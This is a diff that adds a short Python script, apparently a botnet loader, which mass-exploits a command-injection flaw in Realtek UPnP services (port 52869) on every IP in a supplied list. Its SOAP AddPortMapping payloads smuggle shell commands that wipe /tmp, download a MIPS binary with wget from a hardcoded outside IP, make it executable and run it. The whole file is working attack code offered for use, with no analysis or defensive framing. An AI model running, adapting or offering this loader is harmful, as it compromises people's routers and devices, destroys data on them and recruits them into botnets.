@@ -1,0 +1,27 @@
+#! python !#
+import threading, sys, time, random, socket, re, os, struct, array, requests
+ips = open(sys.argv[1], "r").readlines()
+p1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/; rm -rf *; wget http://159.89.204.166/turbo.mips`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>"
+p2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/;chmod +x turbo.mips;./turbo.mips realtek`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>"
+headerlist = {'SOAPAction': 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'}
+
+class rtek(threading.Thread):
+		def __init__ (self, ip):
+			threading.Thread.__init__(self)
+			self.ip = str(ip).rstrip('\n')
+		def run(self):
+			try:
+				print "[Realtek] Loading - " + self.ip
+				url = "http://" + self.ip + ":52869/picsdesc.xml"
+				requests.post(url, timeout=3, headers=headerlist, data=p1)
+				requests.post(url, timeout=2.5, headers=headerlist, data=p2)
+			except Exception as e:
+				pass
+
+for ip in ips:
+	try:
+		n = rtek(ip)
+		n.start()
+		time.sleep(0.03)
+	except:
+		pass
